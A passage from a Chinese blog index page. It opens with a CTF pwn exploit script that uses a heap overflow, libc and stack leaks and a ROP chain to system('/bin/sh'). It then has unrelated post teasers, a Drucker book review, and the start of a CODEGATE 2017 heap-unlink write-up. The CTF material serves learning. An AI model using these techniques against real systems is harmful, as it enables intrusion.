class="title function_">leave</span>(<span class="params">idx, length, payload, overflow=<span class="literal">False</span></span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Length:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> overflow:</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;Message:&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.recvuntil(<span class="string">&#x27;message too long, you can leave on memo though&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">payload</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Edit message:&#x27;</span>)</span><br><span class="line">    r.send(payload)</span><br><span class="line"></span><br><span class="line">global_size = <span class="number">0x602a60</span></span><br><span class="line">libc_start_main_got = <span class="number">0x601fb0</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;bc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave(<span class="number">0</span>, <span class="number">32</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leave(<span class="number">1</span>, <span class="number">32</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overflow</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = (<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="comment"># Restore chunk struct</span></span><br><span class="line">        p64(global_size-<span class="number">0x10</span>))           <span class="comment"># Fake fd</span></span><br><span class="line">leave(<span class="number">0</span>, <span class="number">400</span>, payload, <span class="literal">True</span>)</span><br><span class="line">leave(<span class="number">0</span>, <span class="number">32</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>)                      <span class="comment"># malloc garbage</span></span><br><span class="line">fix_size_payload = <span class="string">&#x27;\xf0&#x27;</span>.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>)*<span class="number">4</span></span><br><span class="line">payload = fix_size_payload + p64(libc_start_main_got)</span><br><span class="line">leave(<span class="number">3</span>, <span class="number">32</span>, payload)                    <span class="comment"># Get the chunk in global</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak libc base</span></span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;View Message: &#x27;</span>)</span><br><span class="line">base = u64(r.recvline()[:-<span class="number">1</span>] + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;base : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(base)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak stack address</span></span><br><span class="line">payload = fix_size_payload + p64(base + libc.symbols[<span class="string">&#x27;environ&#x27;</span>])</span><br><span class="line">edit(payload)</span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;View Message: &#x27;</span>)</span><br><span class="line">stack = u64(r.recvline()[:-<span class="number">1</span>] + <span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>) - <span class="number">0xf0</span></span><br><span class="line">log.success(<span class="string">&#x27;stack : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit</span></span><br><span class="line">payload = fix_size_payload + <span class="string">&#x27;A&#x27;</span>*<span class="number">24</span> + p64(stack)</span><br><span class="line">edit(payload)</span><br><span class="line">sh = base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi =  base + <span class="number">0x0000000000021102</span></span><br><span class="line">payload = p64(pop_rdi) + p64(sh) + p64(system)</span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Return to ROP</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>FLAG: <code>bkp&#123;you are a talented and ambitious hacker&#125;</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/03/01/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E5%A0%86%E4%B9%8BGo%E5%AE%9E%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/03/01/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E5%A0%86%E4%B9%8BGo%E5%AE%9E%E7%8E%B0/" itemprop="url">斐波那契堆之Go实现</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-01T00:00:00+08:00">
                2017-03-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ACM/" itemprop="url" rel="index">
                    <span itemprop="name">ACM</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>一个比二叉堆更高效的数据结构，但是实现起来非常复杂。本科的时候看《算法导论》的时候曾经研究过，不是很明白。今天终于对它有了一个比较清晰的了解。<br><img src="https://ol1kreips.qnssl.com/image.png" alt="enter description here" title="image.png"></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/03/01/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E5%A0%86%E4%B9%8BGo%E5%AE%9E%E7%8E%B0/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/03/01/2017/03/install-hexo/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/03/01/2017/03/install-hexo/" itemprop="url">启用Hexo开源博客系统</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-01T00:00:00+08:00">
                2017-03-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%97%A5%E5%B8%B8/" itemprop="url" rel="index">
                    <span itemprop="name">日常</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>前段时间博客一直使用 FireKylin，总体感觉挺好，但是扩展开发和社区是弱点。而 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 最大特点为纯静态博客系统，同时社区支持也比较好， 故我转而投向了 Hexo 的怀抱。</p>
<p><img src="//www.fanhaobai.com/2017/03/install-hexo/11b9814d-885a-4aca-9b56-94c3ad908f3f.png" alt="预览图">
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/03/01/2017/03/install-hexo/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/26/2017/report-update-of-blog-styles-and-fonts/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/26/2017/report-update-of-blog-styles-and-fonts/" itemprop="url">博客样式与字体的更新报告</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-26T17:29:56+08:00">
                2017-02-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%97%A5%E5%B8%B8/" itemprop="url" rel="index">
                    <span itemprop="name">日常</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>一直想改进一下博客的字体和在手机上的样式，奈何最近一直没有时间，只好作罢。昨天晚上抽出一些时间做了一些改进，顺便写篇博文算是记录<del>灌水</del>（笑）。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/02/26/2017/report-update-of-blog-styles-and-fonts/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/23/2017-02-23-the-practice-of-management-by-drucker/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/23/2017-02-23-the-practice-of-management-by-drucker/" itemprop="url">《管理的实践》读书心得</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-23T22:32:26+08:00">
                2017-02-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/summary/" itemprop="url" rel="index">
                    <span itemprop="name">summary</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <img src="/images/the-practice-of-management.jpg" class="">

<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>最近读完了<a target="_blank" rel="noopener" href="https://item.jd.com/10059510.html">《管理的实践》</a>，这是我读的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%BD%BC%E5%BE%97%C2%B7%E5%BE%B7%E9%B2%81%E5%85%8B">德鲁克</a>的第一本书，这是一本偏综述型的书，比较多的内容是偏笼统的，不过对我来说还是挺有帮助的。</p>
<p>刚刚说了，这是一本偏综述型的书，作者在别的书中，将本书的一些观点进行了细化讨论：</p>
<ul>
<li>《成果管理》（Managing for Results, 1964）是第一本有关企业战略的书籍。</li>
<li>《卓有成效的管理者》（The Effective Executive, 1966）讨论组织中的管理者如何自我管理。</li>
<li>《管理：使命，责任，实务》（Management:Tasks, Responsibilities, Practices, 1973）则是为实际管理工作者所撰写的系统化手册，也是研读管理学的学生的系统化教科书，因此内容尽可能翔实完整，有别于本书容易理解、重启发性的特色。</li>
<li>《动荡时代的管理策略》（Managing in Turbulent Times, 1980）进一步探讨了本书提出的基本问题：我们的事业是什么？我们的事业将是什么？我们的事业究竟应该是什么？但同时也探讨了在动荡时代，企业如何兼顾创新与延续，化变动为契机。</li>
</ul>
<h3 id="第一部分：管理企业"><a href="#第一部分：管理企业" class="headerlink" title="第一部分：管理企业"></a>第一部分：管理企业</h3><p>德鲁克从他的角度介绍了：</p>
<ul>
<li>管理层的主要职责：管理企业、管理管理者、管理员工与工作。</li>
<li>企业的目的：创造顾客。我理解这表达的意思就是解决用户未被满足的需求或痛点。</li>
<li>企业的主要功能：营销和创新。</li>
<li>一些决策分析基础。基本要素分析试图探究未来的事件「为什么」会发生，趋势分析问的问题则是：「有多大的可能」和会「多快」发生。</li>
</ul>
<p>这部分介绍的内容原则简单，实操则极难，算是一个引言章节，便于后面的部分做展开。</p>
<h3 id="第二部分：管理管理者"><a href="#第二部分：管理管理者" class="headerlink" title="第二部分：管理管理者"></a>第二部分：管理管理者</h3><p>这部分先用福特公司的例子，来说明缺乏管理者是福特衰败的主因，老福特失败的根本原因在于，他在经营10亿美元的庞大事业时，有系统且刻意地排除管理者的角色。而福特二世采取了目标管理，将很多决策权下放，最终扭转了福特公司的衰败。</p>
<p>然后德鲁克用比较大的篇幅介绍了「目标管理与自我控制」。这一章非常有用。在这一章节中，德鲁克首先介绍了容易误导管理者的重要因素：</p>
<ol>
<li>管理者的专业工作</li>
<li>管理的层级结构</li>
<li>愿景和工作上的差异，导致各级管理者之间产生隔阂</li>
</ol>
<p>这里面，石匠的例子举得恰到好处：</p>
<blockquote>
<p>本书中举的例子很有参考价值：在企业管理会议上，大家很喜欢谈的故事是：有人问三个石匠他们在做什么。第一个石匠回答：“我在养家糊口。”第二个石匠边敲边回答：“我在做全国最好的石匠活。”第三个石匠仰望天空，目光炯炯有神，说道：“我在建造一座大教堂。”<br>当然，第三个石匠才是真正的“管理者”。第一个石匠知道他想从工作中得到什么，而且也设法达到目标。他或许能“以一天的劳力换取合理的报酬”，但他不是个管理者，也永远不会成为管理者。</p>
</blockquote>
<blockquote>
<p>麻烦的是第二个石匠。工作技艺很重要，没有技艺，任何工作都不可能获得生机。事实上，如果组织不要求成员展现他们最大的本领，员工必定士气低落，但太强调个人技艺，总是隐藏了一个危险。真正的工匠或真正的专业人士，常常自以为有成就，其实他们只不过在磨亮石头或帮忙打杂罢了。企业应该鼓励员工精益求精，但是专精的技艺必须和企业整体需求相关。</p>
</blockquote>
<p>对于程序员来说，只关注于代码的优雅，而不关注于产品的按时上线，就是过于关注专业工作了。我身边有大量这样的例子存在，每个人都关注自己的专业性工作，这样从表面上看是对的，但是却丧失了企业的目标。</p>
<p>所以，确定目标对于管理者来说是非常重要的，因为管理者才能将这样的目标向下进行传达。书中提出了一种简单的方法：给上司写信。列明：自己的工作目标，自己应该达到哪些绩效，需要做哪些事情，这些事情的主要障碍，公司提供哪些东西会形成助力或阻力。最终，这个会用于指导管理者工作的重要章程。</p>
<p>过度地使用流程和规范会使得效果适得其反。如果管理者大部分精力都花在做 PPT，并且 PPT 的质量很大程度决定了他的绩效，那么就会形成坏风气。</p>
<p>每位管理者主要的任务：1、完成上级的目标。2、完成对企业的责任。3、协助下属的工作。</p>
<p>企业必须通过五方面的实践，才能确保正确的精神贯彻于整个管理组织中：</p>
<ol>
<li>必须建立很高的绩效标准，不能宽容差的或平庸的表现，而且必须根据绩效，给予奖励。</li>
<li>每个管理职位本身必须有其价值，而不只是升迁的踏板。</li>
<li>必须建立合理而公平的升迁制度。</li>
<li>管理章程中必须清楚说明谁有权制定事关管理者命运的重要决定，管理者必须有向高层申诉的途径。</li>
<li>在任命管理者的时候，必须很清楚诚实正直的品格是对管理者的绝对要求，是管理者原本就需具备的特质，不能期待他升上管理职位后才开始培养这种特质。</li>
</ol>
<p>评估必须基于绩效。最大的错误是试图根据缺点来做评估。</p>
<p>在培养管理者上，德鲁克认为不应该因人设事。</p>
<h3 id="第三部分-管理的结构"><a href="#第三部分-管理的结构" class="headerlink" title="第三部分 管理的结构"></a>第三部分 管理的结构</h3><p>这一部分讨论了职能部门和业务部门如何组织更为合适。德鲁克还是非常希望建立以产品为中心的业务部门，在他的文章中，他把这个叫做“联邦分权制”的结构。他举了很多例子来说明按业务部门来划分组织结构的优越性，以下是一些摘要：</p>
<blockquote>
<p>根据需要而形成的职能性组织把重心放在专业技能上，员工必须获得相关的知识和能力。然而职能性专家的愿景、技能和忠诚对象可能因此变得太过狭隘，以至于他们完全不适合担任总经理的职位。</p>
</blockquote>
<blockquote>
<p>如果员工认为会计部门的主管掌握了他能否升迁的大权，那么他就会重视自己在“专业会计工作”上的表现甚于对公司的贡献，把更多精力投注于会计部门的扩展上，而非努力促进公司成长。</p>
</blockquote>
<blockquote>
<p>换句话说，多样化的做法反而强化了一致的目标和信念，而这正是建立共同的公民意识所不可或缺的。只有当其他单位会直接受到影响时，才需要一致的做法。但是，却必须建立一致的原则，并且明确说明，严格遵守。</p>
</blockquote>
<p>在互联网公司中，挺多大公司在这方面确实更喜欢采用职能部门的模式来做产品。他们有专门的PM部门，有专门的服务器开发部门，有专门的测试部门，有专门的设计部门。这些职能部门的人很容易产生只关注自己专业能力，而不关心产品（或公司利益）的行为。</p>
<h3 id="第四部分-管理员工和工作"><a href="#第四部分-管理员工和工作" class="headerlink" title="第四部分 管理员工和工作"></a>第四部分 管理员工和工作</h3><p>在人员管理上，德鲁克认为应该给员工很高的绩效责任，并且根据绩效责任来建立相应的奖励。但是，企业不应该要求员工对企业绝对忠诚，就好像企业承诺对员工负起百分之百的责任一样，都是不对的。</p>
<p>在人事管理上，德鲁克整体上是反对成立专门的人事部门的。他的核心观点是：绩效这件事情应该交由主管来做，但是如果人事部门只是做一些辅助性工作的话，又太过于简单。德鲁克肯定了人事管理中的人际关系和科学管理理论。但是认为这些收益远远不足支撑起构建起整个人事管理部门。</p>
<p>德鲁克认为：机械式的工作是反人性的，每个人都需要在工作中找到成就感，即便是机械的工作，加入一些需要判断的事情，都会让人觉得有成就感得多。</p>
<p>我们无法用金钱买到责任感。金钱上的奖赏和诱因当然很重要，但大半只会带来反效果。对奖金不满会变成负面的工作诱因，削弱员工对绩效的责任感。</p>
<h3 id="第五部分-当一名管理者意味着什么"><a href="#第五部分-当一名管理者意味着什么" class="headerlink" title="第五部分 当一名管理者意味着什么"></a>第五部分 当一名管理者意味着什么</h3><p>管理者的工作中包含了五项基本活动，这五项活动共同将所有资源整合成生气蓬勃、不断成长的组织。总结起来：设定目标，组织协调，激励员工，绩效评估，培养人才。</p>
<p>德鲁克强调对于管理者的通才教育，以培养他全面的能力。</p>
<p>在决策方面，德鲁克强调在不完整信息下做决策。他的原话是：</p>
<blockquote>
<p>管理者永远都不可能获得所有应该掌握到的事实。大多数决策的基础都是不完整的知识──原因可能是无法获得所需信息，或要掌握完整信息需要花太多的时间和太高的成本。我们不需要掌握所有事实之后，才能有好的决策；但是我们必须了解还欠缺哪些信息，由此判断决策的风险有多大，以及当建议采取某个行动方案时，其严谨度和准确度有多高。</p>
</blockquote>
<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>本书的观点涉及的话题很广，所以思维导图我整理得很复杂，放在这里供大家参考：<a target="_blank" rel="noopener" href="http://wx1.sinaimg.cn/large/65dc76a3ly1fd0sey03d1j215d8oykjn.jpg">《管理的实践》思维导图</a>。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实我在工作中的很多思考，都从德鲁克的这本书中都得到了一些启发。例如对于职能部门的思考一直困惑着我，在本书中，我看到了以业务部门为核心的联邦制架构的诸多优点，帮助我把这个道理想得更清楚了。又比如那个石匠的故事，用非常形象的方式让大家理解到什么样的工作方式更好。</p>
<p>还有一些小的道理，比如不能基于别人的缺点评估，比如因人设事，这些错误我都曾经犯过或见到别人犯过。一些实践，比如给上司写信，确实帮助我更好地理解了未来的工作目标。</p>
<p>这是一本好书，推荐给大家。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/02/21/CODEGATE-CTF-PREQUALS-2017-messenger/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/02/21/CODEGATE-CTF-PREQUALS-2017-messenger/" itemprop="url">[CODEGATE CTF 2017] messenger 500</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-21T16:38:40+08:00">
                2017-02-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 500<br>Author: Naetw @ BambooFox<br>這題比賽中沒有解出來，後來還是來練習一下</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>64 bits ELF, Partial RELRO, 有 canary, 沒有 NX &amp; PIE。</p>
<p>這題有五個選項：</p>
<p>[L]eave message：</p>
<ul>
<li>最多只能留兩個 messages</li>
<li>size 可以自己決定但是無法超過 32</li>
<li><code>malloc</code> 是作者自己實作的，rev 不太出來 Orz，不過這題重點不在這</li>
</ul>
<p>[R]emove message：</p>
<ul>
<li><code>free</code> 也是作者自己實作的，會做 unlink，這題就是要利用 unlink 讓 puts got.plt 指向我們寫的 shellcode</li>
<li>remove 之後，紀錄 message 數量的 global variable 不會改動</li>
</ul>
<p>[C]hange message：</p>
<ul>
<li>這裡有個 overflow 的漏洞，他會先問 size 這時 size 給大一點的數便可以 overflow 來更改 chunk struct</li>
</ul>
<p>[V]iew message：</p>
<ul>
<li>可以利用這個來 leak heap address</li>
</ul>
<p>[Q]uit：</p>
<ul>
<li>離開程式</li>
</ul>
<p>這邊先說明他的 heap struct(先假設已經留下一則 message size 8)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+</span><br><span class="line">| size      | fd        |  # 一開始就有的 Head</span><br><span class="line">+-----------------------+</span><br><span class="line">|           | size      |  # First message </span><br><span class="line">| fd        | bk        |</span><br><span class="line">| data                  |</span><br><span class="line">+-----------------------+</span><br><span class="line">|           | size      |  # Top chunk</span><br><span class="line">|           | bk        |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>

<p>這裡的 fd, bk 會指向 chunk 儲存 size 的地方，而不是 data 開頭或是 chunk 開頭</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先，先留下一個訊息，接著利用 <code>change</code> 來做 overflow，之後利用 view 來 leak heap address。</p>
<p>一開始的 heap layout：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x603000:      0x0000000000000018      0x0000000000603018           # Head</span><br><span class="line">0x603010:      0x0000000000000000      0x0000000000000400           # Top chunk</span><br><span class="line">0x603020:      0x0000000000000000      0x0000000000603000</span><br><span class="line">0x603030:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603040:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603050:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>留下一則 size 8 的 message：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x603000:      0x0000000000000018      0x0000000000603018           # Head</span><br><span class="line">0x603010:      0x0000000000000000      0x0000000000000031           # First message</span><br><span class="line">0x603020:      0x0000000000603048      0x0000000000603000</span><br><span class="line">0x603030:      0x0000000041414141      0x0000000000000000</span><br><span class="line">0x603040:      0x0000000000000000      0x00000000000003d0           # Top chunk</span><br><span class="line">0x603050:      0x0000000000000000      0x0000000000603018</span><br></pre></td></tr></table></figure>

<p>接下來利用 <code>change</code> 裡面的 overflow 來 leak heap address</p>
